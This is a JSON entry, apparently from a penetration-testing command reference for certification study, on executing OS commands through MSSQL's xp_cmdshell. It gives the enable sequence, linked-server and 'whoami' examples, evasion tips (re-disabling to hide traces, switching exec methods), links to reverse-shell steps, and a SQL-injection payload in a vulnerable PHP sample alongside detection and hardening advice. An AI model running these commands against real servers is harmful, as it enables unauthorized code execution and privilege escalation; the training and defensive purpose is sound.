      "id": "mssql-xp-cmdshell",
      "name": "MSSQL - Command Execution (xp_cmdshell)",
      "command": "xp_cmdshell '<command>'",
      "description": "Runs operating-system commands through SQL Server via the xp_cmdshell extended procedure, giving code execution as the SQL service account. If disabled, enable it through sp_configure (requires advanced options), then run commands.",
      "platform": "windows",
      "requires": [
        "credentials"
      ],
      "protocols": [
        "mssql"
      ],
      "tools": [
        "mssql"
      ],
      "tags": [
        "mssql",
        "xp_cmdshell",
        "rce"
      ],
      "category": "Exploitation",
      "subcategory": "SQL Databases",
      "certifications": [
        "CPTS",
        "OSCP"
      ],
      "primary_cert": "CPTS",
      "source": "CPTS Module 11: Attacking Common Services",
      "examples": [
        {
          "label": "OS command via xp_cmdshell",
          "command": "EXECUTE sp_configure 'show advanced options', 1\nGO\nRECONFIGURE\nGO\nEXECUTE sp_configure 'xp_cmdshell', 1\nGO\nRECONFIGURE\nGO"
        },
        {
          "label": "OS command via xp_cmdshell",
          "command": "xp_cmdshell 'whoami'\nGO"
        },
        {
          "label": "Ch10 — two-step xp_cmdshell enable sequence (sp_configure + RECONFIGURE twice)",
          "command": "EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        },
        {
          "label": "Ch10 — verify execution context (runs as NT SERVICE\\MSSQL$SQLEXPRESS by default)",
          "command": "EXECUTE xp_cmdshell 'whoami';"
        }
      ],
      "notes": "`EXEC xp_cmdshell 'whoami'` runs OS commands as the SQL service account (nt service\\mssql$sqlexpress in Ch10). Enable sequence: sp_configure 'show advanced options', 1 → RECONFIGURE → sp_configure 'xp_cmdshell', 1 → RECONFIGURE. Both RECONFIGURE calls are required. Re-disable after use to reduce artifact footprint. The service account commonly holds SeImpersonatePrivilege → potato escalation path to SYSTEM. Also covered in: OSCP PEN-200 Chapter 10 (SQL Injection Attacks).",
      "references": [
        {
          "title": "HTB Academy - Attacking Common Services",
          "url": "https://academy.hackthebox.com/module/details/116"
        },
        {
          "title": "xp_cmdshell",
          "url": "https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql"
        },
        {
          "title": "OffSec PEN-200 - SQL Injection Attacks",
          "url": "https://www.offsec.com/courses/pen-200/"
        }
      ],
      "recommended": [
        {
          "id": "reverse-shell-oneliners",
          "note": "Collection of reverse shell one-liners across common interpreters.",
          "rel": "next"
        },
        {
          "id": "nc-listener",
          "note": "Starts a netcat listener on the attacker machine to catch an incoming reverse shell from a target.",
          "rel": "next"
        }
      ],
      "opsec": "loud",
      "mitre": [
        "T1059"
      ],
      "exam": "exam-ok",
      "defense": {
        "why_it_works": "xp_cmdshell is a MSSQL extended stored procedure that passes a string to cmd.exe and returns output as rows. It is disabled by default. Enabling it requires two steps: (1) enable 'show advanced options' via sp_configure + RECONFIGURE, then (2) enable 'xp_cmdshell' via sp_configure + RECONFIGURE. Both steps require the connected account to have ALTER SETTINGS (sysadmin or equivalent). Once enabled, EXECUTE xp_cmdshell 'cmd' runs as the SQL Server service account — typically NT SERVICE\\MSSQL$SQLEXPRESS or NT SERVICE\\MSSQLSERVER — not as SYSTEM, but these accounts often hold SeImpersonatePrivilege enabling potato-style escalation to SYSTEM.",
        "prerequisites": "A SQL login with sysadmin (or rights to enable xp_cmdshell) on MSSQL.",
        "impact": "OS command execution on the DB host as the service account - often a strong foothold.",
        "detection": "[MITRE T1059.003] SQL Server audit log: sp_configure 'show advanced options' set to 1 followed by sp_configure 'xp_cmdshell' set to 1 — the two-step enable sequence is a reliable detection signal. Process creation (Sysmon Event 1 / Windows Event 4688): sqlservr.exe spawning cmd.exe or powershell.exe as a child. SIEM: alert on any child process of sqlservr.exe. Network: outbound connections from the SQL Server host to attacker IP (if chained to reverse shell). File: artifacts written via BCP, BULK INSERT, or powershell child processes.",
        "artifacts": "xp_cmdshell config change; sqlservr.exe -> cmd child processes.",
        "prevention": "Disable xp_cmdshell; run SQL Server as a least-privileged, non-admin service account; SQL audit + EDR on sqlservr child processes.",
        "evasion": "Re-disable xp_cmdshell after use; use alternative exec (Ole Automation, CLR) if xp_cmdshell is monitored.",
        "sources": [
          "HTB M11",
          "MITRE T1059"
        ],
        "misconfiguration": "xp_cmdshell is disabled by default — re-enabling it is the misconfiguration. Specifically: the application DB account (or an account reachable via SQLi) has ALTER SETTINGS / sysadmin-level privilege, allowing sp_configure to re-enable xp_cmdshell at runtime. The Administrator account used in OSCP Ch10 connects via -windows-auth with full sysadmin rights — running an internet-facing app as a sysadmin DB account is the root cause. Secondary: no SQL audit policy to alert on sp_configure changes. Tertiary: MSSQL port (1433) reachable from attacker network without firewall restriction.",
        "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
      },
      "type": "command",
      "variations": [
        {
          "label": "Enable it first if disabled",
          "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
        },
        {
          "label": "Via linked server",
          "command": "EXECUTE('xp_cmdshell ''whoami''') AT [<linked_server>]"
        }
      ]
